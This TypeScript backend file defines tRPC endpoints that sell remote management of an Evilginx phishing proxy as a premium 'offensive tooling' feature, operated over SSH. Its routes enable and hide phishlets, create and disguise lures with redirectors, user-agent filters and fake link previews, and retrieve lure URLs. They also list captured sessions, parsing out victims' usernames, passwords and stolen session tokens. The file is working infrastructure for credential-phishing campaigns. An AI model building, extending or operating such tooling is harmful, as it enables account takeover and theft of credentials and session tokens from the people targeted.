/**
 * Evilginx Router — Backend tRPC endpoints for managing Evilginx
 * instances via SSH. Titan-tier exclusive feature.
 *
 * Executes Evilginx CLI commands on the user's configured VPS
 * and returns parsed results.
 */

import { z } from "zod";
import { router, protectedProcedure } from "./_core/trpc";
import { TRPCError } from "@trpc/server";
import { getUserPlan, enforceFeature } from "./subscription-gate";
import { getDb } from "./db";
import { userSecrets } from "../drizzle/schema";
import { eq, and } from "drizzle-orm";
import { Client as SSHClient } from "ssh2";
import { encrypt, decrypt } from "./fetcher-db";

// ─── SSH Execution Helper ─────────────────────────────────────────

interface SSHConfig {
  host: string;
  port: number;
  username: string;
  password?: string;
  privateKey?: string;
}

async function execEvilginxCommand(
  ssh: SSHConfig,
  command: string,
  timeoutMs = 10000
): Promise<string> {
  return new Promise((resolve, reject) => {
    const conn = new SSHClient();
    let output = "";
    let errorOutput = "";
    const timer = setTimeout(() => {
      conn.end();
      reject(new Error("SSH command timed out"));
    }, timeoutMs);

    conn
      .on("ready", () => {
        // Send command to evilginx via its interactive shell
        // We pipe the command through the evilginx binary
        const cmd = `echo '${command.replace(/'/g, "'\\''")}' | sudo evilginx -developer 2>/dev/null || echo '${command.replace(/'/g, "'\\''")}' | evilginx -developer 2>/dev/null`;
        conn.exec(cmd, (err, stream) => {
          if (err) {
            clearTimeout(timer);
            conn.end();
            reject(err);
            return;
          }
          stream
            .on("close", () => {
              clearTimeout(timer);
              conn.end();
              resolve(output.trim());
            })
            .on("data", (data: Buffer) => {
              output += data.toString();
            })
            .stderr.on("data", (data: Buffer) => {
              errorOutput += data.toString();
            });
        });
      })
      .on("error", (err) => {
        clearTimeout(timer);
        reject(err);
      })
      .connect({
        host: ssh.host,
        port: ssh.port,
        username: ssh.username,
        password: ssh.password || undefined,
        privateKey: ssh.privateKey || undefined,
        readyTimeout: 5000,
      });
  });
}

// ─── Parse Helpers ────────────────────────────────────────────────

function parsePhishletList(raw: string): Array<{
  name: string;
  hostname: string;
  status: string;
  isEnabled: boolean;
  isHidden: boolean;
}> {
  const lines = raw.split("\n").filter((l) => l.trim());
  const results: any[] = [];
  // Parse tabular output from `phishlets` command
  for (const line of lines) {
    // Skip header/separator lines
    if (line.includes("---") || line.includes("phishlet") || line.startsWith(":")) continue;
    const parts = line.trim().split(/\s{2,}/);
    if (parts.length >= 2) {
      const name = parts[0]?.trim();
      const hostname = parts[1]?.trim() || "";
      const status = parts[2]?.trim()?.toLowerCase() || "disabled";
      if (name && !name.includes("─")) {
        results.push({
          name,
          hostname,
          status,
          isEnabled: status === "enabled",
          isHidden: status === "hidden",
        });
      }
    }
  }
  return results;
}

function parseLureList(raw: string): Array<{
  id: number;
  phishlet: string;
  hostname: string;
  path: string;
  redirectUrl: string;
  paused: boolean;
}> {
  const lines = raw.split("\n").filter((l) => l.trim());
  const results: any[] = [];
  for (const line of lines) {
    if (line.includes("---") || line.includes("lure") || line.startsWith(":")) continue;
    const parts = line.trim().split(/\s{2,}/);
    if (parts.length >= 2) {
      const id = parseInt(parts[0]?.trim());
      if (!isNaN(id)) {
        results.push({
          id,
          phishlet: parts[1]?.trim() || "",
          hostname: parts[2]?.trim() || "",
          path: parts[3]?.trim() || "",
          redirectUrl: parts[4]?.trim() || "",
          paused: parts[5]?.trim()?.toLowerCase() === "paused",
        });
      }
    }
  }
  return results;
}

function parseSessionList(raw: string): Array<{
  id: number;
  phishlet: string;
  username: string;
  password: string;
  tokens: boolean;
  remoteAddr: string;
  createTime: string;
}> {
  const lines = raw.split("\n").filter((l) => l.trim());
  const results: any[] = [];
  for (const line of lines) {
    if (line.includes("---") || line.includes("session") || line.startsWith(":")) continue;
    const parts = line.trim().split(/\s{2,}/);
    if (parts.length >= 3) {
      const id = parseInt(parts[0]?.trim());
      if (!isNaN(id)) {
        results.push({
          id,
          phishlet: parts[1]?.trim() || "",
          username: parts[2]?.trim() || "",
          password: parts[3]?.trim() || "",
          tokens: parts[4]?.trim()?.toLowerCase() === "captured",
          remoteAddr: parts[5]?.trim() || "",
          createTime: parts[6]?.trim() || "",
        });
      }
    }
  }
  return results;
}

// ─── Router ───────────────────────────────────────────────────────

export const evilginxRouter = router({
  /**
   * Test SSH connection to the Evilginx server
   */
  testConnection: protectedProcedure
    .input(
      z.object({
        host: z.string().min(1),
        port: z.number().default(22),
        username: z.string().min(1),
        password: z.string().optional(),
        privateKey: z.string().optional(),
      })
    )
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

      try {
        const result = await execEvilginxCommand(input, "config", 8000);
        return { success: true, message: "Connected successfully", raw: result };
      } catch (err: any) {
        return { success: false, message: err.message || "Connection failed" };
      }
    }),

  /**
   * Save SSH connection details for the user's Evilginx server
   */
  saveConnection: protectedProcedure
    .input(
      z.object({
        host: z.string().min(1),
        port: z.number().default(22),
        username: z.string().min(1),
        password: z.string().optional(),
        privateKey: z.string().optional(),
      })
    )
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

      const db = await getDb();
      if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "Database unavailable" });

      // Store as encrypted user secret
      const configJson = encrypt(JSON.stringify(input));
      const existing = await db
        .select()
        .from(userSecrets)
        .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__evilginx_ssh")))
        .limit(1);

      if (existing.length > 0) {
        await db
          .update(userSecrets)
          .set({ encryptedValue: configJson, updatedAt: new Date() })
          .where(eq(userSecrets.id, existing[0].id));
      } else {
        await db.insert(userSecrets).values({
          userId: ctx.user.id,
          secretType: "__evilginx_ssh",
          label: "Evilginx SSH Config",
          encryptedValue: configJson,
        });
      }

      return { success: true };
    }),

  /**
   * Get saved SSH connection (masked)
   */
  getConnection: protectedProcedure.query(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

    const db = await getDb();
    if (!db) return null;

    const result = await db
      .select()
      .from(userSecrets)
      .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__evilginx_ssh")))
      .limit(1);

    if (result.length === 0) return null;

    try {
      const config = JSON.parse(decrypt(result[0].encryptedValue));
      return {
        host: config.host,
        port: config.port,
        username: config.username,
        hasPassword: !!config.password,
        hasPrivateKey: !!config.privateKey,
      };
    } catch {
      return null;
    }
  }),

  /**
   * Execute any Evilginx command via SSH
   */
  exec: protectedProcedure
    .input(z.object({ command: z.string().min(1) }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

      const db = await getDb();
      if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });

      const result = await db
        .select()
        .from(userSecrets)
        .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__evilginx_ssh")))
        .limit(1);

      if (result.length === 0) {
        throw new TRPCError({ code: "BAD_REQUEST", message: "No Evilginx server configured. Please set up your SSH connection first." });
      }

      const sshConfig = JSON.parse(decrypt(result[0].encryptedValue));
      const output = await execEvilginxCommand(sshConfig, input.command);
      return { output };
    }),

  // ─── Config ─────────────────────────────────────────────────────

  getConfig: protectedProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

    const db = await getDb();
    if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });

    const result = await db
      .select()
      .from(userSecrets)
      .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__evilginx_ssh")))
      .limit(1);

    if (result.length === 0) throw new TRPCError({ code: "BAD_REQUEST", message: "No server configured" });

    const sshConfig = JSON.parse(decrypt(result[0].encryptedValue));
    const output = await execEvilginxCommand(sshConfig, "config");
    return { output };
  }),

  setConfig: protectedProcedure
    .input(
      z.object({
        domain: z.string().optional(),
        ipv4: z.string().optional(),
        ipv4External: z.string().optional(),
        ipv4Bind: z.string().optional(),
        unauthUrl: z.string().optional(),
      })
    )
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

      const db = await getDb();
      if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });

      const result = await db
        .select()
        .from(userSecrets)
        .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__evilginx_ssh")))
        .limit(1);

      if (result.length === 0) throw new TRPCError({ code: "BAD_REQUEST", message: "No server configured" });

      const sshConfig = JSON.parse(decrypt(result[0].encryptedValue));
      const commands: string[] = [];
      if (input.domain) commands.push(`config domain ${input.domain}`);
      if (input.ipv4) commands.push(`config ipv4 ${input.ipv4}`);
      if (input.ipv4External) commands.push(`config ipv4 external ${input.ipv4External}`);
      if (input.ipv4Bind) commands.push(`config ipv4 bind ${input.ipv4Bind}`);
      if (input.unauthUrl) commands.push(`config unauth_url ${input.unauthUrl}`);

      const results: string[] = [];
      for (const cmd of commands) {
        const out = await execEvilginxCommand(sshConfig, cmd);
        results.push(out);
      }
      return { output: results.join("\n") };
    }),

  // ─── Phishlets ──────────────────────────────────────────────────

  listPhishlets: protectedProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

    const db = await getDb();
    if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });

    const result = await db
      .select()
      .from(userSecrets)
      .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__evilginx_ssh")))
      .limit(1);

    if (result.length === 0) throw new TRPCError({ code: "BAD_REQUEST", message: "No server configured" });

    const sshConfig = JSON.parse(decrypt(result[0].encryptedValue));
    const output = await execEvilginxCommand(sshConfig, "phishlets");
    return { raw: output, phishlets: parsePhishletList(output) };
  }),

  enablePhishlet: protectedProcedure
    .input(z.object({ name: z.string(), hostname: z.string().optional() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

      const db = await getDb();
      if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });

      const result = await db
        .select()
        .from(userSecrets)
        .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__evilginx_ssh")))
        .limit(1);

      if (result.length === 0) throw new TRPCError({ code: "BAD_REQUEST", message: "No server configured" });

      const sshConfig = JSON.parse(decrypt(result[0].encryptedValue));
      const commands: string[] = [];
      if (input.hostname) commands.push(`phishlets hostname ${input.name} ${input.hostname}`);
      commands.push(`phishlets enable ${input.name}`);

      const results: string[] = [];
      for (const cmd of commands) {
        results.push(await execEvilginxCommand(sshConfig, cmd));
      }
      return { output: results.join("\n") };
    }),

  disablePhishlet: protectedProcedure
    .input(z.object({ name: z.string() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

      const db = await getDb();
      if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });

      const result = await db
        .select()
        .from(userSecrets)
        .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__evilginx_ssh")))
        .limit(1);

      if (result.length === 0) throw new TRPCError({ code: "BAD_REQUEST", message: "No server configured" });

      const sshConfig = JSON.parse(decrypt(result[0].encryptedValue));
      const output = await execEvilginxCommand(sshConfig, `phishlets disable ${input.name}`);
      return { output };
    }),

  hidePhishlet: protectedProcedure
    .input(z.object({ name: z.string() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

      const db = await getDb();
      if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });

      const result = await db
        .select()
        .from(userSecrets)
        .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__evilginx_ssh")))
        .limit(1);

      if (result.length === 0) throw new TRPCError({ code: "BAD_REQUEST", message: "No server configured" });

      const sshConfig = JSON.parse(decrypt(result[0].encryptedValue));
      const output = await execEvilginxCommand(sshConfig, `phishlets hide ${input.name}`);
      return { output };
    }),

  setPhishletHostname: protectedProcedure
    .input(z.object({ name: z.string(), hostname: z.string() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

      const db = await getDb();
      if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });

      const result = await db
        .select()
        .from(userSecrets)
        .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__evilginx_ssh")))
        .limit(1);

      if (result.length === 0) throw new TRPCError({ code: "BAD_REQUEST", message: "No server configured" });

      const sshConfig = JSON.parse(decrypt(result[0].encryptedValue));
      const output = await execEvilginxCommand(sshConfig, `phishlets hostname ${input.name} ${input.hostname}`);
      return { output };
    }),

  getPhishletHosts: protectedProcedure
    .input(z.object({ name: z.string() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

      const db = await getDb();
      if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });

      const result = await db
        .select()
        .from(userSecrets)
        .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__evilginx_ssh")))
        .limit(1);

      if (result.length === 0) throw new TRPCError({ code: "BAD_REQUEST", message: "No server configured" });

      const sshConfig = JSON.parse(decrypt(result[0].encryptedValue));
      const output = await execEvilginxCommand(sshConfig, `phishlets get-hosts ${input.name}`);
      return { output };
    }),

  // ─── Lures ──────────────────────────────────────────────────────

  listLures: protectedProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

    const db = await getDb();
    if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });

    const result = await db
      .select()
      .from(userSecrets)
      .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__evilginx_ssh")))
      .limit(1);

    if (result.length === 0) throw new TRPCError({ code: "BAD_REQUEST", message: "No server configured" });

    const sshConfig = JSON.parse(decrypt(result[0].encryptedValue));
    const output = await execEvilginxCommand(sshConfig, "lures");
    return { raw: output, lures: parseLureList(output) };
  }),

  createLure: protectedProcedure
    .input(z.object({ phishlet: z.string() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

      const db = await getDb();
      if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });

      const result = await db
        .select()
        .from(userSecrets)
        .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__evilginx_ssh")))
        .limit(1);

      if (result.length === 0) throw new TRPCError({ code: "BAD_REQUEST", message: "No server configured" });

      const sshConfig = JSON.parse(decrypt(result[0].encryptedValue));
      const output = await execEvilginxCommand(sshConfig, `lures create ${input.phishlet}`);
      return { output };
    }),

  editLure: protectedProcedure
    .input(
      z.object({
        id: z.number(),
        field: z.enum(["hostname", "path", "redirect_url", "redirector", "ua_filter", "og_title", "og_desc", "og_image", "og_url", "info"]),
        value: z.string(),
      })
    )
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

      const db = await getDb();
      if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });

      const result = await db
        .select()
        .from(userSecrets)
        .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__evilginx_ssh")))
        .limit(1);

      if (result.length === 0) throw new TRPCError({ code: "BAD_REQUEST", message: "No server configured" });

      const sshConfig = JSON.parse(decrypt(result[0].encryptedValue));
      const output = await execEvilginxCommand(sshConfig, `lures edit ${input.id} ${input.field} ${input.value}`);
      return { output };
    }),

  deleteLure: protectedProcedure
    .input(z.object({ id: z.number() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

      const db = await getDb();
      if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });

      const result = await db
        .select()
        .from(userSecrets)
        .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__evilginx_ssh")))
        .limit(1);

      if (result.length === 0) throw new TRPCError({ code: "BAD_REQUEST", message: "No server configured" });

      const sshConfig = JSON.parse(decrypt(result[0].encryptedValue));
      const output = await execEvilginxCommand(sshConfig, `lures delete ${input.id}`);
      return { output };
    }),

  pauseLure: protectedProcedure
    .input(z.object({ id: z.number(), duration: z.string() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

      const db = await getDb();
      if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });

      const result = await db
        .select()
        .from(userSecrets)
        .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__evilginx_ssh")))
        .limit(1);

      if (result.length === 0) throw new TRPCError({ code: "BAD_REQUEST", message: "No server configured" });

      const sshConfig = JSON.parse(decrypt(result[0].encryptedValue));
      const output = await execEvilginxCommand(sshConfig, `lures pause ${input.id} ${input.duration}`);
      return { output };
    }),

  unpauseLure: protectedProcedure
    .input(z.object({ id: z.number() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

      const db = await getDb();
      if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });

      const result = await db
        .select()
        .from(userSecrets)
        .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__evilginx_ssh")))
        .limit(1);

      if (result.length === 0) throw new TRPCError({ code: "BAD_REQUEST", message: "No server configured" });

      const sshConfig = JSON.parse(decrypt(result[0].encryptedValue));
      const output = await execEvilginxCommand(sshConfig, `lures unpause ${input.id}`);
      return { output };
    }),

  getLureUrl: protectedProcedure
    .input(z.object({ id: z.number() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

      const db = await getDb();
      if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });

      const result = await db
        .select()
        .from(userSecrets)
        .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__evilginx_ssh")))
        .limit(1);

      if (result.length === 0) throw new TRPCError({ code: "BAD_REQUEST", message: "No server configured" });

      const sshConfig = JSON.parse(decrypt(result[0].encryptedValue));
      const output = await execEvilginxCommand(sshConfig, `lures get-url ${input.id}`);
      return { output };
    }),

  // ─── Sessions ───────────────────────────────────────────────────

  listSessions: protectedProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

    const db = await getDb();
    if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });

    const result = await db
      .select()
      .from(userSecrets)
      .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__evilginx_ssh")))
      .limit(1);

    if (result.length === 0) throw new TRPCError({ code: "BAD_REQUEST", message: "No server configured" });

    const sshConfig = JSON.parse(decrypt(result[0].encryptedValue));
    const output = await execEvilginxCommand(sshConfig, "sessions");
    return { raw: output, sessions: parseSessionList(output) };
  }),

  getSession: protectedProcedure
    .input(z.object({ id: z.number() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

      const db = await getDb();
      if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });

      const result = await db
        .select()
        .from(userSecrets)
        .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__evilginx_ssh")))
        .limit(1);

      if (result.length === 0) throw new TRPCError({ code: "BAD_REQUEST", message: "No server configured" });

      const sshConfig = JSON.parse(decrypt(result[0].encryptedValue));
      const output = await execEvilginxCommand(sshConfig, `sessions ${input.id}`);
      return { output };
    }),

  deleteSession: protectedProcedure
    .input(z.object({ id: z.union([z.number(), z.literal("all")]) }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

      const db = await getDb();
      if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });

      const result = await db
        .select()
        .from(userSecrets)
        .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__evilginx_ssh")))
        .limit(1);

      if (result.length === 0) throw new TRPCError({ code: "BAD_REQUEST", message: "No server configured" });

      const sshConfig = JSON.parse(decrypt(result[0].encryptedValue));
      const output = await execEvilginxCommand(sshConfig, `sessions delete ${input.id}`);
      return { output };
    }),

  // ─── Proxy ──────────────────────────────────────────────────────

  getProxy: protectedProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

    const db = await getDb();
    if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });

    const result = await db
      .select()
      .from(userSecrets)
      .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__evilginx_ssh")))
      .limit(1);

    if (result.length === 0) throw new TRPCError({ code: "BAD_REQUEST", message: "No server configured" });

    const sshConfig = JSON.parse(decrypt(result[0].encryptedValue));
    const output = await execEvilginxCommand(sshConfig, "proxy");
    return { output };
  }),

  setProxy: protectedProcedure
    .input(
      z.object({
        type: z.enum(["http", "socks5"]).optional(),
        address: z.string().optional(),
        port: z.number().optional(),
        username: z.string().optional(),
        password: z.string().optional(),
        enabled: z.boolean().optional(),
      })
    )
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

      const db = await getDb();
      if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });

      const result = await db
        .select()
        .from(userSecrets)
        .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__evilginx_ssh")))
        .limit(1);

      if (result.length === 0) throw new TRPCError({ code: "BAD_REQUEST", message: "No server configured" });

      const sshConfig = JSON.parse(decrypt(result[0].encryptedValue));
      const commands: string[] = [];
      if (input.type) commands.push(`proxy type ${input.type}`);
      if (input.address) commands.push(`proxy address ${input.address}`);
      if (input.port) commands.push(`proxy port ${input.port}`);
      if (input.username) commands.push(`proxy username ${input.username}`);
      if (input.password) commands.push(`proxy password ${input.password}`);
      if (input.enabled !== undefined) commands.push(`proxy enabled ${input.enabled}`);

      const results: string[] = [];
      for (const cmd of commands) {
        results.push(await execEvilginxCommand(sshConfig, cmd));
      }
      return { output: results.join("\n") };
    }),

  // ─── Blacklist ──────────────────────────────────────────────────

  getBlacklist: protectedProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

    const db = await getDb();
    if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });

    const result = await db
      .select()
      .from(userSecrets)
      .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__evilginx_ssh")))
      .limit(1);

    if (result.length === 0) throw new TRPCError({ code: "BAD_REQUEST", message: "No server configured" });

    const sshConfig = JSON.parse(decrypt(result[0].encryptedValue));
    const output = await execEvilginxCommand(sshConfig, "blacklist");
    return { output };
  }),

  setBlacklist: protectedProcedure
    .input(z.object({ mode: z.enum(["off", "unauth", "all"]) }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

      const db = await getDb();
      if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });

      const result = await db
        .select()
        .from(userSecrets)
        .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__evilginx_ssh")))
        .limit(1);

      if (result.length === 0) throw new TRPCError({ code: "BAD_REQUEST", message: "No server configured" });

      const sshConfig = JSON.parse(decrypt(result[0].encryptedValue));
      const output = await execEvilginxCommand(sshConfig, `blacklist ${input.mode}`);
      return { output };
    }),
});
